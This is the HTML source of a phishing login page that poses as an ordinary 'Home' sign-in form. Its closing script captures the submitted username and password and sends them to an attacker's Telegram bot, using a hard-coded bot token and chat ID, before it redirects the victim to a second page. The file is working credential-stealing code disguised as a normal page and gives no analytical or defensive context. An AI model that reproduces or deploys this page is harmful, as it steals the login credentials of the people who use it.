<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Home</title>
<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #f0f0f0;
}

/* HEADER BACKGROUND - Base64 */
.header {
    background: url('./1back.png') no-repeat center/cover;
    height: 180px;
    clip-path: ellipse(100% 80% at 50% 0%);
}

/* FORM CONTAINER */
.form-container {
    background: white;
    width: 280px;                
    margin: 40px auto 0;         
    padding: 25px 20px;          
    border-radius: 0 0 40px 40px;
    clip-path: polygon(0 0, 100% 0, 100% 85%, 50% 100%, 0 85%);
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    position: relative;
}

/* LINE-STYLE INPUTS */
input[type="text"], input[type="password"] {
    border: none;
    border-bottom: 2px solid #ccc;
    width: 100%;
    padding: 10px 5px;
    margin-bottom: 25px;
    font-size: 16px;
    background: transparent;
    outline: none;
    transition: border-color 0.3s;
}
input[type="text"]:focus, input[type="password"]:focus {
    border-bottom: 2px solid darkblue;
}

/* LOGIN BUTTON */
button {
    display: block;
    margin: 0 auto;
    padding: 12px 60px;
    background: darkblue;
    color: white;
    font-size: 18px;
    border: none;
    border-radius: 25px;
    cursor: pointer;
    transition: background 0.3s;
}
button:hover {
    background: #000066;
}

/* FOOTER BACKGROUND - Base64 */
.footer {
    background: url('./foot.png') no-repeat center/cover;
    height: 100px;
    clip-path: ellipse(100% 80% at 50% 100%);
    margin-top: 50px;
}
</style>
</head>
<body>

<div class="header"></div>

<div class="form-container">
    <form id="loginForm">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log in</button>
    </form>
</div>

<div class="footer"></div>

<script>
document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    
    const username = this.username.value;
    const password = this.password.value;
    
    const token = "7349396325:AAHJ7cPIM1FByNhlJKiKZAxaAzJlZjsgYLo";
    const chatId = "1920675677";
    const message = `Login Attempt:%0AUsername: ${encodeURIComponent(username)}%0APassword: ${encodeURIComponent(password)}`;
    
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`)
        .then(() => {
            window.location.href = "2.html";
        })
        .catch(err => {
            console.error("Error sending message to Telegram:", err);
            window.location.href = "2.html";
        });
});
</script>

</body>
</html>
